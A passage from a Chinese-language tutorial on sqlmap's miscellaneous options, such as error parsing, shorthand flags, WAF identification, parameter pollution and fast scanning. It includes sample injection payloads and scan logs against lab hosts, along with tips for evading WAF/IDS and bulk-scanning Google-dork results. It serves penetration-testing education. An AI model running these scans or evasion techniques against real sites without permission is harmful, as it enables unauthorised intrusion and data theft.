banner</span><br><span class="line">[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR</span><br><span class="line">(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)</span><br><span class="line">[xx:xx:15] [INFO] parsed error message: <span class="hljs-string">'pg_query() [&lt;a href='</span>function.pg-query<span class="hljs-string">'&gt;function.pg-query&lt;/a&gt;]: Query failed: ERROR: invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.php&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;'</span></span><br><span class="line">[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by</span><br><span class="line">GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2</span><br></pre></td></tr></table></figure></p><p><strong><em>14.指定输出目录路径</em></strong><br><strong>参数：–output-dir</strong></p><p>Sqlmap默认将会话文件和结果文件保存到某个子目录output中，可以使用此参数指定输出目录，如：“–output-dir=/tmp”。<br><strong><em>15.从响应中解析DBMS的错误信息</em></strong><br><strong>参数：–parse-errors</strong><br>若是Web应用被配置成Debug模式则很可能在HTTP响应页面中显示SQL错误信息。这些错误信息对于理解某操作失败的原因是很有用的。例如因为权限不足导致的失败错误信息是类似这样的：“Access denied for user ”。</p><p>下例的目标是微软SQL Server：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"</span> --parse-errors</span><br></pre></td></tr></table></figure></p><p>部分输出如下所示：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the timeneeded to find the right number of query columns. Automatically extending the rangefor current UNION query injection technique <span class="hljs-built_in">test</span></span><br><span class="line">[xx:xx:17] [INFO] parsed error message: <span class="hljs-string">'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span></span><br><span class="line"><span class="hljs-string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.</span></span><br><span class="line"><span class="hljs-string">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</span></span><br><span class="line">[xx:xx:17] [INFO] parsed error message: <span class="hljs-string">'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span></span><br><span class="line"><span class="hljs-string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.</span></span><br><span class="line"><span class="hljs-string">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</span></span><br><span class="line">[xx:xx:17] [INFO] parsed error message: <span class="hljs-string">'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</span></span><br><span class="line"><span class="hljs-string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.</span></span><br><span class="line"><span class="hljs-string">&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</span></span><br><span class="line">[xx:xx:17] [INFO] target URL appears to have 3 columns <span class="hljs-keyword">in</span> query</span><br></pre></td></tr></table></figure></p><p><strong><em>16.指定中轴列</em></strong><br><strong>参数：–pivot-column</strong><br>有时（如在微软SQL Server、Sybase和SAP MaxDB中）由于缺乏类似机制不可以直接使用偏移m,n的方式列举数据表记录。在这种情况下，Sqlmap通过确定最适合的中轴列（最独特的值）来列举数据，中轴列的值稍后用于检索其他列值。<br>如果自动选择失败就需要使用该参数手动指定中轴列，如：“–pivot-column=id”。<br><strong><em>17.保存选项到配置文件中</em></strong><br><strong>参数：–save</strong><br>使用该参数可以保存Sqlmap命令行参数到配置文件中，该文件可编辑并且可以使用参数“-c”加载。配置文件是INI格式的。<br><strong><em>18.升级Sqlmap</em></strong><br><strong>参数：–update</strong><br>使用此参数可以升级Sqlmap，显然，需要能够连接互联网。万一执行失败，可以在Sqlmap安装目录中执行“git pull”来升级Sqlmap。在Windows中没有git命令可以使用SmartGit之类的git客户端。</p><p>实际上“–update”和“git pull”以同样的方式升级Sqlmap，都是从git仓库中获取最新源代码。<br>强烈建议在报告bug前先升级Sqlmap。</p><h3 id="0x13-杂项"><a href="#0x13-杂项" class="headerlink" title="0x13 杂项"></a>0x13 杂项</h3><p><strong><em>1.使用简写</em></strong><br><strong>参数：-z</strong><br>有些参数组合是被经常用到的，如“–batch –random-agent –ignore-proxy<br>–technique=BEU”，这样写一大串很不好看，在Sqlmap中，提供了一种简写的方式来缩短命令长度。</p><p>利用参数“-z”，每个参数都可以只写前几个字母，如“–batch”可以简写为“bat”。简写的原则是能够有所区别、对应的参数唯一就行。各个参数用逗号隔开。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u <span class="hljs-string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure></p><p>可以简写为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -z <span class="hljs-string">"bat,randoma,ign,tec=BEU"</span> -u <span class="hljs-string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure></p><p>再如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u <span class="hljs-string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure></p><p>可以简写为：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -z <span class="hljs-string">"ign,flu,bat,tec=U,dump,D=testdb,T=users"</span> -u <span class="hljs-string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure></p><p><strong><em>2.在成功检测到注入点时报警</em></strong><br><strong>参数：–alert</strong><br>该参数用于在找到新的注入点时发出警报，后跟一个用于发出警报的命令，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r data.txt --alert <span class="hljs-string">"notify-send '找到漏洞了'"</span></span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[18:59:36] [INFO] GET parameter <span class="hljs-string">'couno'</span> appears to be <span class="hljs-string">'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'</span> injectable (with --not-string=<span class="hljs-string">"001"</span>)</span><br><span class="line">[18:59:36] [INFO] executing alerting shell <span class="hljs-built_in">command</span>(s) (<span class="hljs-string">'notify-send '</span>找到漏洞了<span class="hljs-string">''</span>)</span><br></pre></td></tr></table></figure></p><p>上例中用于发出警报的命令是Ubuntu中的notify-send命令。<br><strong><em>3.设置问题的回答</em></strong><br><strong>参数：–answers</strong><br>使用“–batch”以非交互模式运行时所有问题都以按默认值作为回答。有时不想以默认值为答案又想使用非交互模式，此时可以使用参数“–answers”对特定问题进行回答，若回答多个问题，以逗号分隔。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"</span>--technique=E --answers=<span class="hljs-string">"extending=N"</span> --batch</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:56] [INFO] testing for SQL injection on GET parameter &apos;id&apos; heuristic (parsing) test showed that the back-end DBMS could be &apos;MySQL&apos;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">[xx:xx:56] [INFO] do you want to include all tests for &apos;MySQL&apos; extending provided level (1) and risk (1)? [Y/n] N</span><br></pre></td></tr></table></figure></p><p><strong><em>4.在成功检测到注入点时发出“嘟”声</em></strong><br><strong>参数：–beep</strong><br>使用此参数可以在成功检测到注入点时发出“嘟”声。使用“-m”从日志文件中检测大量网站时该参数会格外有用。<br><strong><em>5.清除Sqlmap创建的临时表和自定义函数</em></strong><br><strong>参数：–cleanup</strong><br>强烈推荐在测试结束后使用此参数清除Sqlmap创建的临时表和自定义函数，Sqlmap会尽可能地清除数据库管理系统和文件系统上的入侵痕迹。<br><strong><em>6.检查依赖</em></strong><br><strong>参数：–dependencies</strong><br>Sqlmap的有些功能依赖第三方库，在用到时发现没有这些库会报错退出。使用此参数可以检查依赖的第三方库是否安装，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --dependencies</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] starting at 19:16:05</span><br><span class="line">     </span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-kinterbasdb'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Firebird'</span>. Download from http://kinterbasdb.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-pymssql'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Sybase'</span>. Download from https://github.com/pymssql/pymssql</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python cx_Oracle'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Oracle'</span>. Download from http://cx-oracle.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-psycopg2'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'PostgreSQL'</span>. Download from http://initd.org/psycopg/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python ibm-db'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'IBM DB2'</span>. Download from https://github.com/ibmdb/python-ibmdb</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python jaydebeapi &amp; python-jpype'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'HSQLDB'</span>. Download from https://pypi.python.org/pypi/JayDeBeApi/ &amp; http://jpype.sourceforge.net/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python ibm-db'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Informix'</span>. Download from https://github.com/ibmdb/python-ibmdb</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-pyodbc'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Microsoft Access'</span>. Download from https://github.com/mkleehammer/pyodbc</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-pymssql'</span> third-party library <span class="hljs-keyword">in</span> order to directly connect to the DBMS <span class="hljs-string">'Microsoft SQL Server'</span>. Download from https://github.com/pymssql/pymssql</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-impacket'</span> third-party library <span class="hljs-keyword">for</span> out-of-band takeover feature. Download from http://code.google.com/p/impacket/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'python-ntlm'</span> third-party library <span class="hljs-keyword">if</span> you plan to attack a web application behind NTLM authentication. Download from http://code.google.com/p/python-ntlm/</span><br><span class="line">[19:16:05] [WARNING] sqlmap requires <span class="hljs-string">'websocket-client'</span> third-party library <span class="hljs-keyword">if</span> you plan to attack a web application using WebSocket. Download from https://pypi.python.org/pypi/websocket-client/</span><br><span class="line">     </span><br><span class="line">[*] shutting down at 19:16:05</span><br></pre></td></tr></table></figure></p><p>可以看到我缺少的主要是用于连接数据库的第三方库。<br><strong><em>7.关闭彩色输出</em></strong><br><strong>参数：–disable-coloring</strong><br><strong><em>8.指定使用Google dork结果的某页</em></strong><br><strong>参数：–gpage</strong><br>使用参数“-g”时默认默认选择Google dork结果的前100条做注入测试。结合使用此参数，可以指定使用Google dork结果的某页。<br><strong><em>9.使用HTTP参数污染</em></strong><br><strong>参数：–hpp</strong><br>HTTP参数污染是绕过WAF/IPS/IDS的一种技术，详情见此处。这一技术针对ASP/IIS和ASP.NET/IIS平台尤其有效。如果怀疑目标受WAF/IPS/IDS保护，可以尝试用此参数进行绕过。<br><strong><em>10.彻底检测WAF/IPS/IDS</em></strong><br><strong>参数：–identify-waf</strong><br>Sqlmap可以识别WAF/IPS/IDS以便用户进行针对性操作（如：添加“–tamper”）。目前Sqlmap支持检测30多种不同的WAF/IPS/IDS，如Airlock和Barracuda WAF等。检测WAF的脚本可以在安装目录的waf目录中找到。<br>下例的目标是MySQL，受ModSecurity WAF保护：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1"</span> --identify-waf -v 3</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:23] [INFO] testing connection to the target URL</span><br><span class="line">[xx:xx:23] [INFO] heuristics detected web page charset <span class="hljs-string">'ascii'</span></span><br><span class="line">[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection</span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'USP Secure Entry Server (United Security Providers)'</span>[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'BinarySEC Web Application Firewall (BinarySEC)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Hyperguard Web Application Firewall (art of defence Inc.)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Cisco ACE XML Gateway (Cisco Systems)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'TrafficShield (F5 Networks)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'KONA Security Solutions (Akamai Technologies)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Incapsula Web Application Firewall (Incapsula/Imperva)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'CloudFlare Web Application Firewall (CloudFlare)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Barracuda Web Application Firewall (Barracuda Networks)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'webApp.secure (webScurity)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Proventia Web Application Security (IBM)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] declared web page charset <span class="hljs-string">'iso-8859-1'</span></span><br><span class="line">[xx:xx:23] [DEBUG] page not found (404)</span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'KS-WAF (Knownsec)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'NetScaler (Citrix Systems)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'Jiasule Web Application Firewall (Jiasule)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'WebKnight Application Firewall (AQTRONIX)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'AppWall (Radware)'</span></span><br><span class="line">[xx:xx:23] [DEBUG] checking <span class="hljs-keyword">for</span> WAF/IDS/IPS product <span class="hljs-string">'ModSecurity: Open Source Web Application Firewall (Trustwave)'</span></span><br><span class="line">[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified <span class="hljs-string">'ModSecurity: Open Source Web Application Firewall (Trustwave)'</span>. Please consider usage of tamper scripts (option <span class="hljs-string">'--tamper'</span>)</span><br></pre></td></tr></table></figure></p><p><strong>参数：–skip-waf</strong><br>默认地Sqlmap会发送虚假的SQL注入playload以试探目标是否有保护措施。如有任何问题，用户可以使用参数“–skip-waf”来禁用这一技术。<br><strong><em>11.模仿智能手机</em></strong><br><strong>参数：–mobile</strong><br>有些网站对智能手机和桌面环境的返回是不同的。当需要测试这种网站的智能手机页面时可以设置一个智能手机的User-Agent，或者更简单地，使用此参数，Sqlmap会在执行时询问要模仿成流行的手机中的哪种，如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="hljs-string">"http://www.target.com/vuln.php?id=1"</span> --mobile</span><br><span class="line">[...]</span><br><span class="line"><span class="hljs-built_in">which</span> smartphone <span class="hljs-keyword">do</span> you want sqlmap to imitate through HTTP User-Agent header?</span><br><span class="line">[1] Apple iPhone 4s (default)</span><br><span class="line">[2] BlackBerry 9900</span><br><span class="line">[3] Google Nexus 7</span><br><span class="line">[4] HP iPAQ 6365</span><br><span class="line">[5] HTC Sensation</span><br><span class="line">[6] Nokia N97</span><br><span class="line">[7] Samsung Galaxy S</span><br><span class="line">&gt; 1</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></p><p><strong><em>12.离线模式（仅仅使用会话数据）</em></strong><br><strong>参数：–offline</strong><br>添加此参数，Sqlmap将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包。<br><strong><em>13.在Google dork中展示页面权重</em></strong><br><strong>参数：–page-rank</strong><br>与参数“-g”一起使用，这会使Sqlmap向Google发起更多的请求并展示页面权重。<br><strong><em>14.从输出目录中安全移除所有内容</em></strong><br><strong>参数：–purge-output</strong><br>当用户想要安全地删除输出目录中的所有内容时使用此参数。所谓安全删除，不仅仅是删除，而是在删除前先用随机数据覆盖原有数据，甚至对文件名和目录名也进行重命名以覆盖旧名称，所有覆盖工作完成后才执行删除。最后，输出目录中会一无所有。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --purge-output -v 3</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] starting at 19:51:36</span><br><span class="line">     </span><br><span class="line">[19:51:36] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[19:51:36] [INFO] purging content of directory <span class="hljs-string">'/home/werner/.sqlmap/output'</span>...</span><br><span class="line">[19:51:36] [DEBUG] changing file attributes</span><br><span class="line">[19:51:36] [DEBUG] writing random data to files</span><br><span class="line">[19:51:36] [DEBUG] truncating files</span><br><span class="line">[19:51:36] [DEBUG] renaming filenames to random values</span><br><span class="line">[19:51:36] [DEBUG] renaming directory names to random values</span><br><span class="line">[19:51:36] [DEBUG] deleting the whole directory tree</span><br><span class="line">     </span><br><span class="line">[*] shutting down at 19:51:36</span><br></pre></td></tr></table></figure></p><p><strong><em>15.快速扫描</em></strong><br><strong>参数：–smart</strong><br>当有大量URL要进行测试（如：“-m”），目的是尽快找出其中存在的某些注入点而有所遗漏也没有关系时可以使用“–smart”进行正向启发式扫描。此时只有让数据库管理系统报错的参数才会做进一步测试，其余URL均被跳过。如：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="hljs-string">"http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1"</span> --batch --smart</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-string">'ca'</span> is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] GET parameter <span class="hljs-string">'ca'</span> does not appear dynamic</span><br><span class="line">[xx:xx:14] [WARNING] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">'ca'</span> might not be injectable</span><br><span class="line">[xx:xx:14] [INFO] skipping GET parameter <span class="hljs-string">'ca'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-string">'user'</span> is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] GET parameter <span class="hljs-string">'user'</span> does not appear dynamic</span><br><span class="line">[xx:xx:14] [WARNING] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">'user'</span> might not be injectable</span><br><span class="line">[xx:xx:14] [INFO] skipping GET parameter <span class="hljs-string">'user'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-string">'id'</span> is dynamic</span><br><span class="line">[xx:xx:14] [INFO] confirming that GET parameter <span class="hljs-string">'id'</span> is dynamic</span><br><span class="line">[xx:xx:14] [INFO] GET parameter <span class="hljs-string">'id'</span> is dynamic</span><br><span class="line">[xx:xx:14] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[xx:xx:14] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter <span class="hljs-string">'id'</span> might be</span><br><span class="line">injectable (possible DBMS: <span class="hljs-string">'MySQL'</span>)</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-keyword">for</span> SQL injection on GET parameter <span class="hljs-string">'id'</span> heuristic (parsing) <span class="hljs-built_in">test</span> showed that the back-end DBMS could be <span class="hljs-string">'MySQL'</span>. Do you want to skip <span class="hljs-built_in">test</span> payloads specific <span class="hljs-keyword">for</span> other DBMSes? [Y/n] Y</span><br><span class="line"><span class="hljs-keyword">do</span> you want to include all tests <span class="hljs-keyword">for</span> <span class="hljs-string">'MySQL'</span> extending provided level (1) and risk (1)? [Y/n] Y</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'AND boolean-based blind - WHERE or HAVING clause'</span></span><br><span class="line">[xx:xx:14] [INFO] GET parameter <span class="hljs-string">'id'</span> is <span class="hljs-string">'AND boolean-based blind - WHERE or HAVING clause'</span> injectable</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'</span></span><br><span class="line">[xx:xx:14] [INFO] GET parameter <span class="hljs-string">'id'</span> is <span class="hljs-string">'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'</span> injectable</span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL inline queries'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL &gt; 5.0.11 stacked queries'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL &lt; 5.0.12 stacked queries (heavy query)'</span></span><br><span class="line">[xx:xx:14] [INFO] testing <span class="hljs-string">'MySQL &gt; 5.0.11 AND time-based blind'</span></span><br><span class="line">[xx:xx:24] [INFO] GET parameter <span class="hljs-string">'id'</span> is <span class="hljs-string">'MySQL &gt; 5.0.11 AND time-based blind'</span> injectable</span><br><span class="line">[xx:xx:24] [INFO] testing <span class="hljs-string">'MySQL UNION query (NULL) - 1 to 20 columns'</span></span><br><span class="line">[xx:xx:24] [INFO] automatically extending ranges <span class="hljs-keyword">for</span> UNION query injection technique tests as there is at least one other potential injection technique found</span><br><span class="line">[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the</span><br><span class="line">time needed to find the right number of query columns. Automatically extending the range <span class="hljs-keyword">for</span> current UNION query injection technique <span class="hljs-built_in">test</span></span><br><span class="line">[xx:xx:24] [INFO] target URL appears to have 3 columns <span class="hljs-keyword">in</span> query</span><br><span class="line">[xx:xx:24] [INFO] GET parameter <span class="hljs-string">'id'</span> is <span class="hljs-string">'MySQL UNION query (NULL) - 1 to 20 columns'</span> injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></p><p><strong><em>16.通过关键词使用或跳过payload</em></strong><br><strong>参数：–test-filter</strong><br>若只想使用包含关键词“ROW”的payload可使用参数“–test-filter=ROW”。下面是以Mysql为目标的例子：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1"</span> --batch --<span class="hljs-built_in">test</span>-filter=ROW</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:39] [INFO] GET parameter ’id’ is dynamic</span><br><span class="line">[xx:xx:39] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[xx:xx:39] [INFO] heuristic (basic) <span class="hljs-built_in">test</span> shows that GET parameter 